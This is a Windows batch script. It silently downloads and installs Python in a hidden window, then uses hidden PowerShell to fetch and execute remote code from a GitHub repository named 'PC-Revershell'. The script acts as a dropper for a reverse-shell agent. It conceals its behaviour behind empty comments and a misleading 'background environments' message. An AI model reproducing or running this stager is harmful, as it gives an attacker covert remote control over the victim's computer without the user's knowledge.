@echo off
setlocal enabledelayedexpansion

::
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [+] Python not found. Installing background environments...
    
    ::
    cd %temp%
    
    ::
    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe', 'python_install.exe')"
    
    ::
    start /wait "" python_install.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    :: 
    del python_install.exe
    
    :: 
    call :RefreshPath
)

::
powershell -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mdarif76769/PC-Revershell/main/agent.py')"

:: 
exit

:RefreshPath
for /f "tokens=2*" %%A in ('reg query "HKLM\System\CurrentControlSet\Control\Session Manager\Environment" /v Path') do set "Path=%%B"
goto :eof
